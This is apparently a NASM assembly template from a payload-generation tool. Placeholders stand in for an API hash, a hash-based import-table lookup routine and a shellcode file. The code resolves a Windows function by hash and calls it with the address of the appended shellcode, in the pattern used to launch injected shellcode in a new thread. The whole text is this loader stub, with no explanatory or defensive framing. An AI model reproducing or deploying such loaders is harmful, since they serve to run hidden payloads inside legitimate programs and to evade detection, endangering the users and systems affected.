[bits 32]
[section .text]

    cld
    call hash_call_IAT
    ret
%include "{hash_search_IAT}"
hash_call_IAT:
    push {hash}
    call hash_search_IAT
    pop ebx
    xor ecx, ecx
    push ecx
    push ecx
    push ecx
    call $+5
    pop ebx
    add ebx, 0xa
    push ebx
    push ecx
    push ecx
    call eax
    ret

__shellcode:
%include "{shellcode}"